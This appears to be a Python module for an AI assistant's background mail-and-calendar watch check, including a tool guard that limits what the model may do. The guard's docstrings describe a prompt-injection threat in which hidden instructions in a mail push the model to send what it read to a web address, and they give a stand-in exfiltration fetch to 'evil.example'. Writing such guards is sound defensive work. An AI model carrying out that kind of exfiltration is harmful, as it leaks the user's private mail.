"""One watch check (spec parts 2 and 3): find the sources when they're stale, run the watcher's turn with its five
tools and the user's Watch for entries, then apply the report (card, pushes, posts) or, without one, a card written by
code. Sources that just failed three times in a row, or just came back, are said once."""
from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timedelta
from pathlib import Path

from odie.watch import bills, sent, sources
from odie.watch import report as rep
from odie.watch.fetch import STATE, Fetcher
from odie.watch.tools import Check, watch_tools

log = logging.getLogger("odie.watch")
INTERVAL = timedelta(minutes=30)
# What the watch may change without the user's tap (the owner's choice, 21 Oct 2026): adding an event to the calendar
# for a bill's due date or a deadline a mail names. Nothing else that writes: no sending, replying, paying or deleting.
# Bills and orders (the owner's choice, 21 Oct 2026): also updating that event, to mark a bill paid or an order delivered
# or moved. Closing a paid bill's reminder goes through the watch's own close_reminder, never task_update.
MAY_WRITE = frozenset({"calendar_create_event", "mac_calendar_add", "calendar_update_event"})
REACHES_OUT = frozenset({"web_fetch", "web_search", "find_images"})  # tools that send words to the web
# The web addresses written in the user's Watch for entries, set by run_check before each turn: once the check has read
# mail, these are the only places it may still fetch (a fixed address the user wrote carries nothing from the mail).
WATCH_FOR_ADDRESSES: set[str] = set()
_ADDRESS = re.compile(r"https?://[^\s<>\"')\]]+")
CARD_DAYS = 14  # Today's Up next shows two weeks of the calendar
SKILL = Path(__file__).parent / "skill" / "SKILL.md"
WATCH_FOR = "Watch for"


def due(store, now: datetime) -> bool:
    """Is a watch check due? Yes when there has been none (or its time is unreadable), or INTERVAL has passed.
    Example: last check 09:00 -> False at 09:20, True at 09:30; never checked -> True."""
    last = (store.get_setting(STATE) or {}).get("last_check")
    if not last:
        return True
    try:
        return now - datetime.fromisoformat(last) >= INTERVAL
    except ValueError:
        return True


def watch_for(memory) -> str:
    try:
        topic = memory.load().topic(WATCH_FOR)
    except Exception:  # noqa: BLE001 (no memory file yet)
        return ""
    if topic is None or not topic.entries:
        return ""
    return "\n".join(f"- {e.title}: {e.body.strip()}" for e in topic.entries[:30])


def addresses_in(watch: str) -> set[str]:
    """The web addresses written in the Watch for text: "- HN: check https://news.ycombinator.com/item?id=1 daily" ->
    {"https://news.ycombinator.com/item?id=1"}; "" -> set()."""
    return {found.rstrip(".,;") for found in _ADDRESS.findall(watch or "")}


def fetch_allowed_after_mail(tool_name: str, args: dict) -> bool:
    """Whether a tool that reaches the web may still run after the check has read mail: only web_fetch, and only of an
    address written in a Watch for entry (WATCH_FOR_ADDRESSES), which the user wrote and tapped. Example: web_fetch of
    the HN page in the user's entry -> True; web_fetch("https://evil.example/?d=...") -> False; web_search -> False."""
    if tool_name != "web_fetch":
        return False
    url = str((args or {}).get("url") or "").strip().rstrip("/")
    return url in {a.rstrip("/") for a in WATCH_FOR_ADDRESSES}


def guard(tool, args, tool_context) -> dict | None:
    """before_tool_callback for the watch's turn: what a background check refuses (odie.trackers.guard), and also
    changing memory, the shell, handing files over, closing tasks and the browser.
    Example: new_mail -> None (runs); update_memory -> refused; browser_open -> refused (the browser keeps signed-in
    sites); task_update -> refused (the watch closes a paid bill's reminder with its own close_reminder);
    calendar_create_event, calendar_update_event -> None (MAY_WRITE); web_fetch before any mail is read -> None, and
    after the turn has read mail or events (new_mail, read_mail, upcoming_events, search_mail, sent_to, read_thread)
    -> refused, unless it fetches an address the user wrote in a Watch for entry (fetch_allowed_after_mail): a mail's
    hidden instructions could otherwise carry what the check read out to a web address."""
    from odie.trackers import guard as trackers_guard
    from odie.watch.tools import READ_MAIL
    if tool.name in MAY_WRITE:
        return None
    state = getattr(tool_context, "state", None) or {}  # a context without a turn state has read nothing yet
    read_mail = bool(state.get(READ_MAIL))
    if read_mail and tool.name in REACHES_OUT and not fetch_allowed_after_mail(tool.name, args):
        return {"error": "Not after reading mail in this check: report it as a needs-you item instead."}
    refused = trackers_guard(tool, args, tool_context)
    if refused:
        return refused
    not_for_the_watch = tool.name in ("update_memory", "forget_memory", "run_shell", "hand_over", "task_update",
                                      "watch_close")
    is_browser = tool.name.startswith("browser_")
    if not_for_the_watch or is_browser:
        return {"error": "Not allowed in the background watch: report it as a needs-you item instead."}
    return None


def calendar_skills(store, owner: str = "") -> list[str]:
    """The connected apps' skills a watch check starts with loaded, so it can write to their calendars: one per
    calendar source that is an app (MCP); the Mac's own calendar tools are always there. Gmail and Calendar plus the
    Mac's Calendar -> ["mcp-gmail-calendar"]; only a mail app -> []."""
    names: list[str] = []
    for src in sources.saved(store, owner):
        is_calendar_app = src.kind == "calendar" and src.style != "native"
        name = f"mcp-{src.server}"
        if is_calendar_app and name not in names:
            names.append(name)
    return names


def needs_catch_up(fetcher) -> bool:
    """Whether this check also reads the last month's bills, payments and orders: once per catch-up version, until a
    check that ran it reports. Never run -> True; ran bills.CATCH_UP -> False; ran an older one -> True."""
    return fetcher.caught_up != bills.CATCH_UP


def finish_catch_up(fetcher, reported: bool) -> None:
    """After a check that caught up: done when it reported; a failed turn tries again at the next check, up to
    bills.CATCH_UP_TRIES, then it's given up so a slow model doesn't fail every check. Reported -> done; 1st failure ->
    again next time; 2nd failure -> given up (logged)."""
    if reported:
        fetcher.caught_up = bills.CATCH_UP
        return
    fetcher.catch_up_tries += 1
    if fetcher.catch_up_tries >= bills.CATCH_UP_TRIES:
        log.warning("watch: the bills catch-up failed %d times; given up", fetcher.catch_up_tries)
        fetcher.caught_up = bills.CATCH_UP


def catch_up_prompt(prompt: str, older: list[dict]) -> str:
    """The check's prompt with the catch-up's mail after it: the watch handles these like new mail, once."""
    return (f"{prompt}\n\nThis check is also a one-time catch-up: these are the last {bills.CATCH_UP_DAYS} days' bills, "
            "payments and orders, from before the watch kept them. Handle them as the skill says (an event and a "
            "reminder for a bill still due, a paid one closed, an order's event on its delivery day, a delivered or "
            "cancelled one marked), skip what's over, and make needs-you items only for what still needs the user. "
            "read_mail reads any of them in full.\n" + json.dumps(older, ensure_ascii=False))


def _instruction(memory_text: str, watch: str) -> str:
    body = SKILL.read_text().split("---", 2)[-1].strip()
    return (f"{body}\n\n## Watch for\n{watch or '(nothing yet)'}\n\n## What you remember about the user\n{memory_text or '(nothing)'}")


def nudge_text(check) -> str:
    """The second ask for a turn that ended without report: the mail and events the check read, because the nudge
    runs as a fresh turn that remembers nothing."""
    return ("You ended the watch check without calling report. This is what the check read; call report now "
            "(an empty needs_you list when nothing needs the user, and a one-sentence line for Today).\n"
            f"Mail: {json.dumps([check.fenced(m) for m in check.mails], ensure_ascii=False)}\n"
            f"Events: {json.dumps([e.brief() for e in check.events], ensure_ascii=False)}")


def has_news(check, open_threads: list[dict], last_check, catching_up: bool) -> bool:
    """Whether a check has anything new for the model to read; without, no model call (proactive design §4, for every
    owner). New: a mail, a mail the user sent that code didn't already match, an event that is new, moved or cancelled,
    the one-time catch-up, or a thread whose due date passed since the last check.
      nothing in the inbox, the calendar as it was, threads due tomorrow -> False (no call)
      one new mail -> True;  the 15:00 standup moved to 16:00 -> True;  a reply owed due 10:00, checked 09:45 and
      10:15 -> True at 10:15, False at 10:45 (already said)"""
    if check.mails or check.sent or catching_up:
        return True
    if any(e.change for e in check.events):
        return True
    from odie.watch.threads import became_overdue
    return any(became_overdue(t["due"], last_check, check.fetcher.now) for t in open_threads)


async def run_check(store, now: datetime, turn, push, memory=None, memory_index: str = "", owner: str = "") -> str:
    """One check of one watch: everyday Odie's (owner "") or a personality's own (odie.watch.owner: its apps, its
    card, its threads). Returns "off" (nothing to read), "quiet" (nothing new: no model call), "ok" or "fallback"."""
    from odie.watch import pushes
    from odie.watch.owner import key
    from odie.watch.threads import open_threads
    if sources.stale(store, now, owner):
        await sources.detect_and_save(store, owner)
    if not sources.saved(store, owner):
        card_key = key(rep.CARD, owner)
        kept = (store.get_setting(card_key) or {}).get("done", [])
        store.set_setting(card_key, {"checked_at": now.isoformat(timespec="seconds"), "line": "", "needs_you": [], "events": [],
                                     "sources": {}, "off": "Connect Gmail and Calendar (Zapier, Composio or another app) to see them here.",
                                     "done": kept})
        return "off"
    fetcher = Fetcher(store, now, owner)
    check = Check(fetcher)
    last_check = None
    if fetcher.state.get("last_check"):
        last_check = datetime.fromisoformat(fetcher.state["last_check"])
    # The user's own mail since the last check: a reply in an open item's thread closes it now, in code; the rest is
    # the check's "What you sent" (odie.watch.sent). Read here, not by the model, so it never depends on the model.
    sent_by_the_user = await fetcher.sent_mail()
    check.sent = sent.close_answered(store, now, sent_by_the_user, owner)
    # Read first, so a check with nothing new makes no model call; the turn's new_mail gives the same list.
    check.mails = await fetcher.new_mail()
    check.mail_read = True
    check.events = await fetcher.upcoming_events()
    # A mail in a thread an open loop holds, or GitHub's mail about the same pull request, joins that loop in code.
    from odie.loops import shortcut
    check.loop_of = shortcut.attach_known(store, owner, check.mails, now)
    catching_up = needs_catch_up(fetcher)
    if not has_news(check, open_threads(store, now, owner), last_check, catching_up):
        card_events = await fetcher.events_ahead(CARD_DAYS)
        rep.nothing_new(store, now, card_events, fetcher.statuses, owner)
        fetcher.commit()
        return "quiet"
    tools = watch_tools(check)
    watch = watch_for(memory) if memory is not None else ""
    WATCH_FOR_ADDRESSES.clear()
    WATCH_FOR_ADDRESSES.update(addresses_in(watch))
    instruction = _instruction(memory_index, watch)
    prompt = "Run the watch check."  # the background turn puts the time before it (odie.app.runner.background_turn)
    if catching_up:
        older = await fetcher.catch_up_mail()
        if older:
            prompt = catch_up_prompt(prompt, [check.fenced(m) for m in older])
    reason = ""
    last_task_before = _last_task_id(store, owner)
    from odie.loops import budget
    budget.count(store, now)  # the day's proactive calls (odie.loops.budget): counted, never stopped
    try:
        await turn(prompt, tools, instruction)
    except Exception as e:  # noqa: BLE001 (a failed turn still leaves a card)
        reason = f"{type(e).__name__}: {e}"[:160]
        log.warning("watch turn failed", exc_info=True)
    check.read = True  # read before the turn, for the nudge and for the card's counts
    if check.report is None:  # small models often stop short of report: one nudge, with what the check read
        budget.count(store, now)
        try:
            await turn(nudge_text(check), tools, instruction)
        except Exception as e:  # noqa: BLE001
            reason = f"{type(e).__name__}: {e}"[:160]
            log.warning("watch nudge failed", exc_info=True)
    if catching_up:
        finish_catch_up(fetcher, reported=check.report is not None)
    card_events = await fetcher.events_ahead(CARD_DAYS)
    added_task = _last_task_id(store, owner) > last_task_before  # task_add ran during the check: a reminder for the user
    first = bool(fetcher.first)
    failing = rep.failing_now(store, fetcher.statuses, owner)  # read against the last check, so before commit()
    r = check.report
    to_push: list[dict] = []
    try:
        if r is None:
            rep.fallback(store, now, check.mails, card_events, fetcher.statuses, reason or "no report from the model",
                         owner)
        else:
            to_push = rep.apply(store, now, r["needs_you"], r["line"], check.mails, card_events, fetcher.statuses,
                                first, owner)
    finally:
        # the check's place is saved first: a post that fails never makes it run again every 5 minutes. A turn that
        # raised (a timeout) and left no report leaves its mail for the next check (fetch.Fetcher.commit)
        fetcher.commit(turn_failed=bool(reason) and r is None)

    def ping(title: str, body: str) -> None:
        try:
            push(title, body)
        except Exception:  # noqa: BLE001
            log.warning("watch: a push failed", exc_info=True)
    for app in failing:  # Today's Needs you says it too, until the app works again
        ping(pushes.title_for(store, owner, f"{app} stopped working"), "Fix it in Settings → Connected apps.")
    if r is None:
        return "fallback"
    for it in to_push:  # what needs the user soon: a push each, within the day's shared budget; the card is on Pulse
        pushes.started_by_odie(store, now, owner, it["title"], it["why"], ping)
    from odie.agent.tools.files import hand_over, workspace
    ws = workspace().resolve()
    for d in r["done"]:
        media = []
        files = d.get("files") or []
        for x in files:
            if not x:
                continue
            f = Path(x).resolve()
            if f.is_file() and ws in f.parents:  # only files in Odie's workspace can be handed over
                got = hand_over(f, f.name)
                if "media" in got:
                    media.append(got["media"])
        message = str(d.get("message") or "Done.")[:500]
        told = worth_telling(d, media, added_task)
        rep.keep_done(store, now, message, told, media, owner=owner)  # a told note shows on Pulse, under Needs you
        if not told:
            log.info("watch: done, not told: %s", message)
            continue
        done_title = "Odie: done"
        if owner:
            done_title = pushes.title_for(store, owner, "Done")
        ping(done_title, message[:160])
    return "ok"


def _last_task_id(store, owner: str = "") -> int:
    """The newest task's id (0 with none) of this watch's owner, the watch's own threads left out: compared before and
    after the check, it says whether the check added a reminder for the user (opening a thread to follow is not one)."""
    mine, values = bills.whose_tasks(owner)
    row = store.one(f"select max(id) n from tasks where (source_kind is null or source_kind != 'watch') and {mine}",
                    values)
    if row is None or row["n"] is None:
        return 0
    return int(row["n"])


def worth_telling(item: dict, media: list, added_task: bool) -> bool:
    """Does something the watch did for a Watch for entry become a chat message (and a push)? Only when the user gets
    something from it: files to open, a task the check added (a reminder), or the check marked it "tell": true
    (something new he'd act on; a quoted "true" counts too). Anything else stays quiet, on the card and in the log: a
    check that only relayed, found nothing new, found it already covered, or couldn't do something in the background
    tells the user nothing.
    Example: {"message": "The deck from Asha's PDF is ready", "files": [deck]} -> True (a file card);
    a relay check that added task #41, no tell -> True (a reminder is told when the model didn't say);
    the same check's {"message": "HN: still no reply", "tell": false} -> False (the model said quiet);
    {"message": "Asha's flight moved to 18:00", "tell": "True"} -> True;
    {"message": "Relayed the digests; both events already covered, nothing added"}, no task added -> False."""
    if media:
        return True
    tell = item.get("tell")
    if isinstance(tell, str):
        tell = tell.strip().lower() == "true"
    if tell is None:
        return added_task  # the model said nothing: a reminder the check added is still worth telling
    return tell is True
